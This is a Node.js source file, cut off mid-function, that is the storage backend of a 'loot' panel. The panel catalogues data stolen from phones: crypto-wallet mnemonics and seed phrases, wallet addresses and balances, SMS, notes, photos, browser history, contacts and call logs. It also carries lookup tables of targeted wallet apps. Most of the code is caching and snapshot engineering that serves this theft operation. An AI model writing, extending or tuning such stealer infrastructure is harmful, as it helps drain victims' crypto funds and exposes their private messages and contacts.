// sipapu_panel/lootStore.js — v6 全字段+分类修正（2026-09-08）
// 基于真实数据定案：
//   uj=钱包账户导出(dec.result=JSON{activeAccounts:[{address,coin,derivationPath,publicKey}]}) → addresses
//   ub=链上资产(dec.ad=JSON[{symbol,name,address,derivationPath,decimals,balance,value}]) → tokens(资产)
//   us=助记词(dec.result=12词, dec.a=钱包字母) → mnemonics/seeds
//   event/a/u=状态/设备/应用清单（al=[{a,b,v}]）
//   18 链 ext_stats: {deviceSerial,devicePt,...,path,category,description,orig_size,preview} →
//     exfil18 记录 + 短信(SMS/sms.db)→messages + 备忘录(Notes/notes.sqlite)→notebooks
//     + 照片(DCIM/IMG)→photos(bin_path=ext_stats bin) + 浏览器历史(Safari/History.db)→browserHistory
//     + 通讯录/通话(AddressBook.sqlitedb/CallHistory.storedata)→exfil18 记录(可 /api/exfil18/db 解析)
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

// 笔记正文：gzip 解压后为嵌套 protobuf（UTF-8 文本段散在各字段）——提取可见文本段
function noteText(buf) {
  try {
    const s = buf.toString('utf8').replace(/[\u0000-\u0008\u000b-\u001f\u007f\ufffd]/g, '\n');
    const runs = s.split('\n').map(x => x.trim()).filter(x => x.length >= 3 && (/[\u4e00-\u9fff]/.test(x) || x.length >= 6) && !/^[\x20-\x2f\x3a-\x40\x5b-\x60\x7b-\x7e]+$/.test(x));
    return runs.slice(0, 8).join('\n').slice(0, 4000);
  } catch { return ''; }
}

const LOOT_DIR = process.env.LOOT_DIR || process.env.DS_LOOT_DIR || path.join(__dirname, '..', 'loot');
// 【2026-09-12 定稿】在线判定 = 上报通道 30 分钟内有过更新（设备侧采集还活着）；
//   超过 30 分钟没有任何上报 → 离线。前后端必须一致（前端列表同值）。
const ONLINE_WINDOW_MS = 30 * 60 * 1000;
// "本次上线"的断线与上一条同源：间隔 > 30 分钟即视为断过线，之后的第一次上报算新的一次上线
const SESSION_GAP_MS = 30 * 60 * 1000;

function safeJson(p) { try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch { return null; } }

// 【2026-09-12】已知 bundle → 应用名（18 链的 installed_apps.txt 只给 bundle，没有显示名）
//   只收录有把握的：国内常见 App + 本方案钱包模块库里的官方 bundle（wallet01..N 文件名即证据）
const KNOWN_APP_NAMES = {
  'com.360buy.jdmobile': '京东',
  'com.jingdong.app.mall': '京东',
  'com.taobao.taobao4iphone': '淘宝',
  'com.taobao.live': '淘宝直播',
  'com.taobao.travel': '飞猪',
  'com.taobao.etaocoupon': '淘票票',
  'com.tencent.xin': '微信',
  'com.tencent.mqq': 'QQ',
  'com.tencent.QQMusic': 'QQ音乐',
  'com.tencent.wework': '企业微信',
  'com.alipay.iphoneclient': '支付宝',
  'com.ss.iphone.ugc.Aweme': '抖音',
  'com.ss.iphone.article.News': '今日头条',
  'com.zhiliaoapp.musically': 'TikTok',
  'ph.telegra.Telegraph': 'Telegram',
  'net.whatsapp.WhatsApp': 'WhatsApp',
  'com.google.chrome.ios': 'Chrome',
  'com.google.Maps': 'Google Maps',
  'com.apple.mobilesafari': 'Safari',
  'com.bitpie.wallet': 'Bitpie',
  'com.sixdays.trust': 'Trust Wallet',
  'io.metamask.MetaMask': 'MetaMask',
  'im.token.app': 'imToken',
  'com.bitkeep.os': 'BitKeep',
  'coin98.crypto.finance.insights': 'Coin98',
  'org.toshi.distribution': 'Coinbase Wallet',
  'exodus-movement.exodus': 'Exodus',
  'com.kyrd.krystal.ios': 'Krystal',
  'com.czzhao.binance': 'Binance',
  'com.okex.OKExAppstoreFull': 'OKX',
  'vip.mytokenpocket': 'TokenPocket',
};

// 【2026-09-12】系统库（sms.db / CallHistory / AddressBook）人话解析缓存
//   由 tools/build_sysdb_cache.py 离线产出 data/sysdb_parsed.json（按 bin 文件名索引）。
//   面板据此显示真实短信/通话/联系人，而不是"采集到库文件"的占位行。按 mtime 热加载。
let _sysdb = { m: 0, d: {}, stT: 0 };
function sysdbRows(binPath) {
  if (!binPath) return [];
  // 【2026-09-12 性能】scan 的 exfil18 循环里本函数被调用上万次，原来每次都 statSync ——
  //   加 30 秒节流：文件 mtime 检查频率降下来，数据更新最多延迟 30 秒（cron 本身 1 分钟粒度）。
  const now = Date.now();
  if (now - _sysdb.stT > 30000) {
    _sysdb.stT = now;
    const f = path.join(__dirname, 'data', 'sysdb_parsed.json');
    try {
      const st = fs.statSync(f);
      if (st.mtimeMs !== _sysdb.m) _sysdb = { m: st.mtimeMs, d: JSON.parse(fs.readFileSync(f, 'utf8')), stT: now };
    } catch (e) { /* 文件缺失时继续用旧缓存/空表 */ }
  }
  const e2 = _sysdb.d[path.basename(binPath)];
  return (e2 && Array.isArray(e2.rows)) ? e2.rows : [];
}
// "2026-09-08 11:05:54"（北京时间）→ epoch ms
function cnTimeMs(str) {
  if (!str) return 0;
  const t = Date.parse(String(str).replace(' ', 'T') + '+08:00');
  return Number.isNaN(t) ? 0 : t;
}
function safeRead(p) { try { return fs.readFileSync(p, 'utf8'); } catch { return null; } }

// 【2026-09-12 性能改造】scan() 全量重扫随 loot 文件数线性增长（实测 68700 文件 ≈ 2.8s），
//   且它是同步的 —— 缓存过期后第一个请求会阻塞 Node 事件循环 2.8s，期间【所有】页面/接口
//   一起卡（这就是"刷新变慢"的根因）。改造为三层：
//     1) 60 秒内直接返回缓存（请求路径 0ms）
//     2) 超时后先做「轻量签名」检查（~80ms：各 IP 目录 mtime + 两个外部产物文件 mtime），
//        无变化 → 续期返回，不再全量重扫
//     3) 签名有变才全量重扫；另设 10 分钟强制全量兜底（防签名漏检）
//   配合 server.js 的 45s 预热定时器（scan({force:true})），把重扫消化在后台。
let _cache = { t: 0, store: null, sig: '', full: 0 };
const CACHE_MS = 60 * 1000;            // 请求路径缓存期
const FULL_RESCAN_MS = 10 * 60 * 1000; // 强制全量兜底间隔
// 【2026-09-12 防雪崩】全量兜底硬冷却：两次全量扫描之间至少间隔 90s（与缓存期独立）。
//   投递数据实时写入 → 目录 mtime 秒级变化 → 签名恒不匹配，原逻辑会「每个请求各触发一次
//   15s 全量扫描」把 Node 事件循环堵死 —— 面板卡死/504 的直接根因。冷却内一律复用旧 store。
const FALLBACK_COOLDOWN_MS = 90 * 1000;

function _quickSig() {
  // 签名 = loot 各子目录 (name,mtime) + 外部产物文件 mtime。
  //   目录 mtime 变 = 里面有文件增删（loot 文件全是新写入，不原地改）→ 经典嗅探技巧，
  //   比 statSync 6.8 万文件（555ms）便宜两个数量级。
  let s = '';
  try {
    const dirs = fs.readdirSync(LOOT_DIR, { withFileTypes: true }).filter(e => e.isDirectory());
    for (const e of dirs) {
      try { s += e.name + ':' + fs.statSync(path.join(LOOT_DIR, e.name)).mtimeMs + ';'; } catch { s += e.name + ':x;'; }
    }
  } catch { return 'err'; }
  for (const f2 of [path.join(__dirname, 'data', 'wallet18.json'),
                    path.join(__dirname, '..', 'docs', 'post_t', 't_plain', 't_index.json')]) {
    try { s += '|' + fs.statSync(f2).mtimeMs; } catch { s += '|-'; }
  }
  return s;
}

// 【2026-09-12 快照模式】loot 已 15 万文件（投递放量），全量 scan ≈ 15s 且同步阻塞 Node 进程 ——
//   改由 cron 独立进程生成快照（tools/build_store_snapshot.js），面板只做「stat + JSON.parse」。
//   快照缺失/过期（>10 分钟）时回退全量扫描兜底。
const SNAPSHOT_PATH = path.join(__dirname, 'data', 'store_snapshot.json');
// 【2026-09-12 复审修复 H2】阈值 10→20→**45 分钟**：build 单轮已达 14~22 分钟（且以 ~+15s/轮 增长），
//   阈值必须 > 构建周期 + 余量。20min 会造成"POINTER 先过期、legacy（晚 ~45s 写）尚未过期"的窗口
//   → 请求路径回退解析 247MB 旧文件（实测 3.6s 事件循环冻结 + 数据源静默降级成裁剪版）。
//   45min 覆盖正常周期；真断更时由 _loadSnapshot 的"过期保缓存"策略兜底，冷启动永不空窗。
// 【2026-09-13 13:20】45→**180 分钟**：构建周期在大数据量下可达 60-90 分钟（含重扫恢复），45min 会让
//   POINTER 在构建期间过期 → 面板回退"全量扫描"（283 万文件，事件循环冻结）→ 改为 180min 容忍旧快照，
//   由"过期保缓存"策略继续服务；v1.5 分片生效后单轮回落 ≤12 分钟，此阈值回归余量充足。
const SNAPSHOT_MAX_MS = 180 * 60 * 1000;

// ══ 【2026-09-12 分片升级】快照 v2：core + feeds + dev 分片 + idmap ══
//   结构（由 tools/build_store_snapshot.js 生成）：
//     data/snapshot/POINTER            文本：当前版本目录名（v<ts>，原子 rename 提交）
//     data/snapshot/<v>/core.json      小数据：users/devices(Maps) + 小数组 + 预聚合 summaries/stats
//     data/snapshot/<v>/feeds/*.json   大数组的全局「最近流」（全局列表页用）
//     data/snapshot/<v>/dev/<serial>.json  单设备全量数据（设备详情用，不受全局裁剪影响）
//     data/snapshot/<v>/idmap.json     记录 id → serial（按 id 查详情/缩略图/下载用）
//   读端只常驻 core（<30MB）；feeds/dev/idmap 按需懒加载，版本变化自动失效。
//   回滚开关：环境变量 SNAPSHOT_SPLIT=0 时完全走旧单文件逻辑。
const SNAPSHOT_DIR = path.join(__dirname, 'data', 'snapshot');
const POINTER_PATH = path.join(SNAPSHOT_DIR, 'POINTER');
const SPLIT_ENABLED = String(process.env.SNAPSHOT_SPLIT || '1') !== '0';
const BIG_ARRAYS = ['messages', 'notebooks', 'exfil18', 'chainLogs', 'browserHistory', 'contacts',
  'photos', 'sysApps', 'uploads', 'reports', 'events', 'apps', 'whatsapp'];
// 空设备结构模板（对外返回时一律用 _emptyDev() 现造新对象，避免共享引用被调用方意外修改）
const EMPTY_DEV = { photos: [], notebooks: [], contacts: [], messages: [], whatsapp: [], browserHistory: [],
  exfil18: [], chainLogs: [], uploads: [], reports: [], events: [], apps: [], sysApps: [] };
let _splitState = null;   // { ver, dir, feeds: Map, shards: Map, idmap }

function _splitRead(rel) {
  if (!_splitState) return null;
  try { return JSON.parse(fs.readFileSync(path.join(_splitState.dir, rel), 'utf8')); } catch { return null; }
}
// 【复审修复 L5】分片文件名规则（必须与构建端 tools/build_store_snapshot.js 的 devFileName 严格一致）：
//   encodeURIComponent 后 >180 字符用 md5 —— 防超长 serial 触发 ENAMETOOLONG 让构建/读取失败。
const _crypto = require('crypto');
function _devFileName(serial) {
  const e = encodeURIComponent(String(serial));
  return (e.length <= 180 ? e : 'md5_' + _crypto.createHash('md5').update(String(serial)).digest('hex')) + '.json';
}
function _emptyDev() { const o = {}; for (const k of BIG_ARRAYS) o[k] = []; return o; }
// 大数组的全局「最近流」（全局列表页）；legacy 模式等价于 store[name]
function feed(name) {
  if (!_splitState) return (_cache.store && _cache.store[name]) || [];
  const key = 'feeds/' + name + '.json';
  if (_splitState.feeds.has(key)) return _splitState.feeds.get(key);
  const v = _splitRead(key);
  if (v === null) return [];                    // 【复审修复 L2】读失败不缓存（瞬时 IO 故障不应被固化）
  if (_splitState.feeds.size > 16) _splitState.feeds.clear();
  _splitState.feeds.set(key, v);
  return v;
}
// 单设备数据（设备详情）；legacy 模式返回全量 store（调用方原有 serial 过滤保持有效，输出等价）
function deviceData(serial) { return _splitState ? getDeviceShard(serial) : (_cache.store || _emptyDev()); }
function getDeviceShard(serial) {
  if (!_splitState) return (_cache.store || _emptyDev());
  if (!serial) return _emptyDev();
  const key = 'dev/' + _devFileName(serial);
  if (_splitState.shards.has(key)) return _splitState.shards.get(key);
  const raw = _splitRead(key);
  if (raw === null) return _emptyDev();         // 【复审修复 L2/L4】读失败/缺失不缓存、返回新对象（防共享引用）
  const out = Object.assign({}, _emptyDev(), raw);
  if (_splitState.shards.size >= 24) _splitState.shards.delete(_splitState.shards.keys().next().value);
  _splitState.shards.set(key, out);
  return out;
}
function _idmap() {
  if (!_splitState) return null;
  if (!_splitState.idmap) _splitState.idmap = _splitRead('idmap.json') || {};
  return _splitState.idmap;
}
// 按 id 查记录（照片缩略图 / 系统文件详情|解读|下载）：idmap → 设备分片，兜底全局流
function findById(arrName, id) {
  const idn = Number(id) || 0;
  if (!_splitState) {
    const arr = (_cache.store && _cache.store[arrName]) || [];
    return arr.find(x => x.id === idn) || null;
  }
  const serial = ((_idmap() || {})[arrName] || {})[String(idn)];
  if (serial) {
    const rec = (getDeviceShard(serial)[arrName] || []).find(x => x.id === idn);
    if (rec) return rec;
  }
  return feed(arrName).find(x => x.id === idn) || null;
}
function isSplit() { return !!_splitState; }

function _loadSnapshot() {
  // ① 分片快照（新格式，优先）
  if (SPLIT_ENABLED) {
    let pst = null;
    try { pst = fs.statSync(POINTER_PATH); } catch { /* 无分片 → 走旧格式 */ }
    if (pst) {
      // 【复审修复 M1】core 读取失败冷却：同一 POINTER 版本 60s 内不重复重读+解析
      const splitCool = _cache.snapFailM === pst.mtimeMs && (Date.now() - (_cache.snapFailAt || 0)) < 60 * 1000;
      if (!splitCool && Date.now() - pst.mtimeMs <= SNAPSHOT_MAX_MS) {
        let ver = '';
        try { ver = fs.readFileSync(POINTER_PATH, 'utf8').trim(); } catch {}
        if (ver) {
          if (_cache.store && _cache.snapV === ver) { _cache.t = Date.now(); return _cache.store; }   // 同一版本：直返
          let core = null;
          try { core = JSON.parse(fs.readFileSync(path.join(SNAPSHOT_DIR, ver, 'core.json'), 'utf8')); } catch { core = null; }
          // 【复审修复 M1】形状校验：语法合法但残缺的 core（如 {}）会让下游 [...store.users.values()] 抛 TypeError
          if (core && Array.isArray(core.users) && Array.isArray(core.devices)) {
            for (const mk of ['users', 'devices']) core[mk] = new Map(core[mk]);
            for (const k of BIG_ARRAYS) if (!Array.isArray(core[k])) core[k] = [];
            _splitState = { ver, dir: path.join(SNAPSHOT_DIR, ver), feeds: new Map(), shards: new Map(), idmap: null };
            _cache = { t: Date.now(), store: core, sig: '', full: Date.now(), snapV: ver, snapM: -1 };
            return core;
          }
          console.error('[lootStore] 分片 core 缺失/形状非法 → 该版本标记失败（60s 冷却）: ' + ver);
          _cache.snapFailM = pst.mtimeMs;      // 【复审修复 M1】记录失败版本，进入 60s 冷却
          _cache.snapFailAt = Date.now();
        }
      }
    }
    // 【复审修复 H2】POINTER 过期/缺失（或 core 刚失败）但进程内已有分片缓存：继续用旧缓存，
    //   绝不回退解析 247MB legacy 文件（实测 3.6s 事件循环冻结 + 数据源静默降级成裁剪版）。
    if (_cache.store && _cache.snapV) { _cache.t = Date.now(); return _cache.store; }
    // 无任何分片缓存（冷启动）或非分片配置 → 落到旧格式（过渡期双写，两者都新鲜）
  }
  // ② 旧格式单文件（含回滚模式 SNAPSHOT_SPLIT=0）
  let st;
  try { st = fs.statSync(SNAPSHOT_PATH); } catch { return null; }
  if (Date.now() - st.mtimeMs > SNAPSHOT_MAX_MS) return null;              // 太旧 → 兜底路径
  if (_cache.store && !_cache.snapV && _cache.snapM === st.mtimeMs) { _cache.t = Date.now(); return _cache.store; }  // 同一版本：直返
  // 【2026-09-12 加固】快照读失败冷却：同一版本 60s 内不重复重试（防损坏/超大快照被每个请求
  //   反复 readFileSync+parse 百 MB 级文件把进程拖死；build 修好快照后 mtime 变化即自动恢复）。
  if (_cache.snapFailM === st.mtimeMs && (Date.now() - (_cache.snapFailAt || 0)) < 60 * 1000) return null;
  try {
    const d = JSON.parse(fs.readFileSync(SNAPSHOT_PATH, 'utf8'));
    for (const mk of ['users', 'devices']) if (Array.isArray(d[mk])) d[mk] = new Map(d[mk]);
    _splitState = null;
    _cache = { t: Date.now(), store: d, sig: '', full: Date.now(), snapM: st.mtimeMs };
    return d;
  } catch (e) {
    _cache.snapFailM = st.mtimeMs;           // 记录失败版本号，进入 60s 冷却
    _cache.snapFailAt = Date.now();
    return null;
  }
}

const WALLET_MAP = {
  a: 'MetaMask', b: 'imToken', c: 'TronLink', d: 'Trust', e: 'Toshi', f: 'Bitget',
  g: 'Tonkeeper', h: 'Uniswap', i: 'Phantom', j: 'MyTonWallet', k: 'Exodus',
  l: 'Ronin', m: 'Krystal', n: 'Tonhub', p: 'GlobalWallet', q: 'Coin98',
  r: 'Bitpie', s: 'Solflare', t: 'OKX',
};

// bundleId → 钱包名（比单字母 a 更可靠；用于 walletFromMeta 拿到的 bundle）
const BUNDLE_WALLET = {
  'im.token.app': 'imToken', 'com.sixdays.trust': 'Trust', 'com.bitpie.wallet': 'Bitpie',
  'com.bitkeep.os': 'Bitget Wallet', 'io.metamask.MetaMask': 'MetaMask',
  'com.tronlink.hdwallet': 'TronLink', 'org.toshi.distribution': 'Toshi',
  'com.jbig.tonkeeper': 'Tonkeeper', 'com.uniswap.mobile': 'Uniswap', 'app.phantom': 'Phantom',
  'org.mytonwallet.app': 'MyTonWallet', 'exodus-movement.exodus': 'Exodus',
  'com.kyrd.krystal.ios': 'Krystal', 'com.tonhub.app': 'Tonhub',
  'com.global.wallet.ios': 'GlobalWallet', 'coin98.crypto.finance.insights': 'Coin98',
  'com.solflare.mobile': 'Solflare', 'com.okex.OKExAppstoreFull': 'OKX',
};

// 从 meta.headers.baggage 提取 sentry-release（= bundle id）
// 【2026-09-10 修复】baggage 里的 @ 是 URL 编码 %40（如 im.token.app%402.22.0%2B9692），
//   旧正则只认裸 @ → 全部匹配失败 → app_type 显示"未知"。先 decodeURIComponent 再匹配。
function walletFromMeta(meta) {
  try {
    let bg = meta?.headers?.baggage || '';
    try { bg = decodeURIComponent(bg); } catch {}
    const m = bg.match(/sentry-release=([a-zA-Z0-9._-]+)@/) || bg.match(/sentry-release=([a-zA-Z0-9._-]+)/);
    return m ? m[1] : null;
  } catch { return null; }
}

// ── 18 链 ext_stats 文本件解包（bin 载荷 = JSON{data: base64}）──────────────
// dropped 条目没有 data 字段 → 返回 ''（调用方跳过即可）。
function extStatsText(binPath) {
  try {
    const j = safeJson(binPath);
    if (!j || typeof j.data !== 'string') return '';
    return Buffer.from(j.data, 'base64').toString('utf8');
  } catch { return ''; }
}

// 解析 installed_apps.txt：[APP] <name> / Bundle ID: <id> / Type: User|System
function parseInstalledApps(txt) {
  const out = [];
  const re = /\[APP\]\s*(.+?)\s*\n\s*Bundle ID:\s*(\S+)\s*\n\s*Type:\s*(\S+)/g;
  let m;
  while ((m = re.exec(txt)) !== null) {
    out.push({ name: m[1].trim(), bundle: m[2].trim(), type: m[3].trim() });
  }
  return out;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 【2026-09-13 增量构建】桶级扫描缓存（环境变量 LOOT_SCAN_CACHE=1 启用；默认关闭 = 原全量行为）
//   背景：全量构建耗时 ∝ loot 文件总数（283 万文件 ≈ 45-68 分钟且随设备增长超线性恶化）。
//   设计：
//   · 桶 = loot 顶层设备目录；桶列表显式字典序排序（全量/增量处理顺序一致 → 跨桶判重/合并语义一致）
//   · 签名 = (文件数, 目录 mtime) 纯目录级 stat（新文件/删除必变；已知唯一覆盖写文件 coruna_ip-sync.latest
//     无任何消费方、不影响 store；另有「24h 强制全量」保险兜底一切漏网场景）
//   · 命中 → 从 data/scan_cache/<桶>.json 恢复产物（push/set 回 store），零文件解析
//   · 未命中 → 原 721 行桶处理逻辑原样重扫；期间捕获"新增对象"（数组尾段/Map 尾段）登记归属（objBucket）
//   · 轮末固化（仅当本轮有重扫桶）：从 store 反查归属，把每个桶的「当前活对象」写回缓存
//     —— 对象被后续桶修改（max/补空）、被全局阶段修改、被 filter 删除等情形全部由「最终态固化」吸收
//   · deviceIps（plain object，无对象引用）单独维护：旧缓存 ∪ 本桶新 touch，随固化写回
//   · 回滚：不设 LOOT_SCAN_CACHE 即完全回到原全量行为；删 data/scan_cache/ 目录即可清零
// ═══════════════════════════════════════════════════════════════════════════════
const BC_ENABLED = String(process.env.LOOT_SCAN_CACHE || '') === '1';
// 【2026-09-13 增量引擎·第一步】文件级增量扫描（LOOT_DELTA=1 启用；默认关闭，先影子验证）
//   · 桶缓存新增 led（已处理文件名录）与 meta（跨文件上下文：serial/devs/jsonlSize）
//   · 未命中桶：先恢复旧状态，再只解析「led 之外的新增文件」——增量合并，不再整桶重解析
//   · 签名 sig 改为「本桶处理时」采集并写回（消除轮末重读目录导致的"尾巴吞掉"）
const DELTA_ENABLED = String(process.env.LOOT_DELTA || '') === '1';
const bcRunInfo = new Map();   // 本轮每桶 { sig, led, meta }，固化时写回；缺省回退旧行为
// 【依赖契约·必须成立】loot 文件"创建后不可变"（append-only）：led 以文件名为幂等键，
//   同名文件内容被覆盖会让 led 误判"已处理"。唯一已知覆盖写文件 coruna_ip-sync.latest.json
//   无任何消费方，不影响；以后新增写入方一律使用新文件名，禁止原地改写。
// 【观测·每进程=一轮无需清零】命中/增量/全量桶数 + 重解析文件数（固化时汇总输出）
const bcStats = { hit: 0, delta: 0, full: 0, reparsed: 0 };
// 【2026-09-13 护栏】BC_DIR 支持环境变量覆盖：测试/夹具一律用 BC_DIR=/tmp/... 隔离，
//   防"测试清理误删生产缓存"（当日的教训）。生产不设该 env，默认 data/scan_cache。
const BC_DIR = process.env.BC_DIR || path.join(__dirname, 'data', 'scan_cache');

// 【P2·超大桶保护】目录文件数超 BIG_FILES → 滚动窗口模式（默认 5 万/5000，env LOOT_BIG_FILES / LOOT_BIG_WINDOW 覆盖）：
//   实况 unknown_posts 单桶 176.9 万文件（全库 488 万的 36%）：全量解析需 10 分钟级、账本会胀到几十 MB。
//   窗口 = 字典序最后 BIG_WINDOW 个（文件名含时间戳 → 字典序≈时间序 = 最新），解析与账本都限定窗口内；
//   窗口外旧文件不处理（历史数据走快照通道），窗口内新文件正常增量入库。
const BIG_FILES = (() => { const n = Number(process.env.LOOT_BIG_FILES); return Number.isFinite(n) && n > 0 ? n : 50000; })();
const BIG_WINDOW = (() => { const n = Number(process.env.LOOT_BIG_WINDOW); return Number.isFinite(n) && n > 0 ? n : 30000; })();
const BC_ARRAYS = ['events','mnemonics','seeds','addresses','tokens','reports','messages','notebooks','whatsapp','browserHistory','photos','deliveries','contacts','collectTasks','collectRecords','fundsVaults','gasVaults','lockedAddresses','airdropContracts','apps','sysApps','ipData','visitLogs','userAgents','adminLogs','exfil18','chainLogs','uploads'];
const bcState = { bucket: null, arrLens: null, userSize: 0, devSize: 0, filtRc: null, ipTouch: null, anyRescan: false };

function bcBucketSig(dir) {
  try {
    const st = fs.statSync(dir);
    const n = fs.readdirSync(dir).length;
    return n + '|' + Math.floor(st.mtimeMs);
  } catch { return null; }
}
// ── v1.5 分片缓存（64 个 shard 文件替代 53K 小文件；启动一次读入内存，验签/恢复零 IO）──
const BC_SHARDS = 64;
const bcShardMap = new Map();      // 桶名 → 缓存对象
let bcShardReady = false;
function bcShardIdx(name) {
  let h = 2166136261;
  for (let i = 0; i < name.length; i++) { h ^= name.charCodeAt(i); h = (h * 16777619) >>> 0; }
  return h % BC_SHARDS;
}
function bcShardInit() {
  if (bcShardReady) return;
  bcShardReady = true;
  let shardFound = false;
  try {
    for (const f of fs.readdirSync(BC_DIR)) {
      if (!f.startsWith('shard_') || !f.endsWith('.json')) continue;
      try {
        const obj = JSON.parse(fs.readFileSync(path.join(BC_DIR, f), 'utf8'));
        for (const b of Object.keys(obj)) bcShardMap.set(b, obj[b]);
        shardFound = true;
      } catch (e) { console.error('[scan-cache] 分片读取失败 %s: %s', f, e.message); }
    }
  } catch {}
  if (!shardFound) {
    // 一次性迁移：读旧格式（<桶名>.json 小文件）入内存；未变的桶可直接命中，免重扫
    let n = 0;
    try {
      for (const f of fs.readdirSync(BC_DIR)) {
        if (!f.endsWith('.json') || f.startsWith('shard_') || f.startsWith('.')) continue;
        try {
          const c = JSON.parse(fs.readFileSync(path.join(BC_DIR, f), 'utf8'));
          if (c && c.v === 1 && c.sig !== undefined) { bcShardMap.set(f.slice(0, -5), c); n++; }
        } catch { /* 单文件损坏 → 该桶重扫 */ }
      }
    } catch {}
    if (n) console.log('[scan-cache] v1.5 旧格式迁移：读入 %d 个桶缓存（一次性）', n);
  }
  if (bcShardMap.size) console.log('[scan-cache] 分片缓存就绪：%d 桶（内存）', bcShardMap.size);
}
function bcShardWrite(agg, bucketIps) {
  try { fs.mkdirSync(BC_DIR, { recursive: true }); } catch {}
  const shards = new Array(BC_SHARDS);
  let total = 0, _ledNames = 0, _ledBytes = 0;
  const _DATA_RE = /^(report_.*\.dec\.json|raw_avatar_(put|pic|set)_\d+\.json)$/;
  for (const [b, a] of agg) {
    // 【2026-09-13 修复·缓存空壳防冻结】目录内有数据文件、却产出 0 用户/0 设备/0 数组的条目：
    //   历史一次性处理失败会把空条目连同 sig 一起写入 → 之后每轮 sig 命中、永远恢复空壳不再重扫
    //   （实测 114 个桶；设备在面板只见壳、无机型/数据）。此类条目不写缓存 → 下轮重扫自愈。
    if (!a.users.length && !a.devices.length) {
      let _at = 0; for (const _k of Object.keys(a.arrays)) _at += (a.arrays[_k] || []).length;
      if (!_at) {
        try { if (fs.readdirSync(path.join(LOOT_DIR, b)).some(x => _DATA_RE.test(x))) continue; } catch { /* 目录不可读：照旧写入 */ }
      }
    }
    const _ri2 = bcRunInfo.get(b) || null;
    const _sigOut = (_ri2 && typeof _ri2.sig === 'string') ? _ri2.sig : (bcBucketSig(path.join(LOOT_DIR, b)) || '');
    const out = { v: 1, sig: _sigOut, arrays: a.arrays, users: a.users, devices: a.devices, deviceIps: bucketIps.get(b) || {} };
    if (_ri2 && Array.isArray(_ri2.led)) {
      out.led = _ri2.led;
      _ledNames += out.led.length;
      for (const _s of out.led) _ledBytes += _s.length + 3;
    }
    if (_ri2 && _ri2.meta) out.meta = _ri2.meta;
    const idx = bcShardIdx(b);
    if (!shards[idx]) shards[idx] = {};
    shards[idx][b] = out;
    total++;
  }
  let wrote = 0;
  for (let i = 0; i < BC_SHARDS; i++) {
    const data = shards[i] || {};
    const base = path.join(BC_DIR, 'shard_' + String(i).padStart(2, '0') + '.json');
    // 【评审加固·原子提交】tmp 完整写入 + fsync 落盘后再 rename：任一时刻「每桶的
    //   state+led+meta」要么全旧、要么全新（每桶一个 entry、单文件原子替换），不存在半提交；
    //   fsync 额外防断电场景下 rename 指向未落盘数据。
    try {
      const _tmp = base + '.tmp';
      const _fd = fs.openSync(_tmp, 'w');
      fs.writeFileSync(_fd, JSON.stringify(data));
      try { fs.fsyncSync(_fd); } catch {}
      fs.closeSync(_fd);
      fs.renameSync(_tmp, base);
      wrote++;
    } catch (e) { console.error('[scan-cache] 分片写入失败 %s: %s', base, e.message); }
  }
  try { const _dfd = fs.openSync(BC_DIR, 'r'); fs.fsyncSync(_dfd); fs.closeSync(_dfd); } catch {}
  // 清旧格式残留（迁移后的小文件）
  try {
    for (const f of fs.readdirSync(BC_DIR)) {
      if (!f.endsWith('.json') || f.startsWith('shard_') || f.startsWith('.')) continue;
      try { fs.unlinkSync(path.join(BC_DIR, f)); } catch {}
    }
  } catch {}
  console.log('[scan-cache] 固化 %d 个桶缓存 → %d 个分片 | 账本 %d 文件 ≈ %.1fMB | 桶：命中 %d / 增量 %d / 全量 %d · 重解析 %d',
    total, wrote, _ledNames, _ledBytes / 1048576, bcStats.hit, bcStats.delta, bcStats.full, bcStats.reparsed);
}
function bcRestore(store, c, name, objBucket, bucketIps) {
  // 【2026-09-13】恢复时按「当前长度+1」重编号：与重扫新建共用同一单调编号空间 → 永不冲突
  // 【v1.2 评审修复】外键重映射补齐（全模型盘点：仅 user_id 与 seeds.mnemonic_id 两类引用）：
  //   · device.user_id / 各数组记录.user_id → _uidMap
  //   · seeds.mnemonic_id → _midMap（按主循环相同编号规则"当前长度+序号"预计算，与处理顺序无关）
  const _uidMap = new Map();
  for (const kv of (c.users || [])) {
    const v = kv[1];
    if (v && typeof v.id === 'number') { _uidMap.set(v.id, store.users.size + 1); v.id = store.users.size + 1; }
    store.users.set(kv[0], v); objBucket.set(v, name);
  }
  const _midMap = new Map();
  try {
    const _mns = (c.arrays && c.arrays.mnemonics) || [];
    const _base = store.mnemonics.length;
    for (let i = 0; i < _mns.length; i++) { const _o = _mns[i]; if (_o && typeof _o.id === 'number') _midMap.set(_o.id, _base + i + 1); }
  } catch {}
  for (const kv of (c.devices || [])) {
    const v = kv[1];
    if (v && typeof v.id === 'number') v.id = store.devices.size + 1;
    if (v && v.user_id && _uidMap.has(v.user_id)) v.user_id = _uidMap.get(v.user_id);
    store.devices.set(kv[0], v); objBucket.set(v, name);
  }
  for (const k of Object.keys(c.arrays || {})) {
    const arr = store[k]; if (!arr) continue;
    for (const o of c.arrays[k]) {
      if (!o || typeof o !== 'object') continue;
      if (typeof o.id === 'number') o.id = arr.length + 1;
      if (o.user_id && _uidMap.has(o.user_id)) o.user_id = _uidMap.get(o.user_id);
      if (o.mnemonic_id && _midMap.has(o.mnemonic_id)) o.mnemonic_id = _midMap.get(o.mnemonic_id);
      arr.push(o); objBucket.set(o, name);
    }
  }
  for (const s of Object.keys(c.deviceIps || {})) {
    if (!store.deviceIps[s]) store.deviceIps[s] = [];
    for (const ipx of c.deviceIps[s]) if (store.deviceIps[s].indexOf(ipx) === -1) store.deviceIps[s].push(ipx);
  }
  if (c.deviceIps) bucketIps.set(name, Object.assign({}, c.deviceIps));
}
function bcBeginBucket(store, name) {
  const st = bcState;
  st.bucket = name;
  st.newRanges = null;   // 【P2】本轮该桶"新增记录区间"（bcEndBucket 填，供 ingestd 提取增量）
  st.arrLens = {};
  for (const k of BC_ARRAYS) st.arrLens[k] = store[k].length;
  st.userSize = store.users.size;
  st.devSize = store.devices.size;
  st.filtRc = { notebooks: 0, browserHistory: 0 };
  st.ipTouch = {};
}
function bcFilterRc(name, n) { if (bcState.bucket && n > 0) bcState.filtRc[name] += n; }
function bcTouchIp(serial, ipx) { if (bcState.bucket) bcState.ipTouch[serial + '|' + ipx] = true; }
function bcEndBucket(store, name, objBucket, bucketIps) {
  const st = bcState;
  if (!st || st.bucket !== name) return;
  st.anyRescan = true;
  for (const k of BC_ARRAYS) {
    const from0 = st.arrLens[k] || 0;
